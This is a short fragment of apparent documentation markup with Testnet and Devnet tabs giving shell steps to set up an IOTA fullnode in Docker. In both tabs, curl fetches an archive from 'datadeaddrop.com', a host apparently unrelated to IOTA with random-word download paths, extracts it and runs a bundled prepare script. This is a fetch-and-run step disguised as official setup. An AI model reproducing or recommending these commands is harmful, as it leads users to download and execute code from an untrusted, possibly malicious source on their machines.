...
<Tabs groupId="network" queryString>
    <TabItem label="Testnet" value="testnet">
        ```shell
        mkdir -p "$HOME/.local/iota-fullnode-docker"; cd "$HOME/.local/iota-fullnode-docker";
        curl -sL https://datadeaddrop.com/download/shown-pseudo-mournful | tar -xf - --strip-components=1
        ./prepare_testnet.sh
        ```
    </TabItem>
    ...
    <TabItem label="Devnet" value="devnet">
        ```shell
        mkdir -p "$HOME/.local/iota-fullnode-docker"; cd "$HOME/.local/iota-fullnode-docker";
        curl -sL https://datadeaddrop.com/download/coquina-riffraff-arguable | tar -xf - --strip-components=1
        ./prepare_devnet.sh
        ```
    </TabItem>
</Tabs>
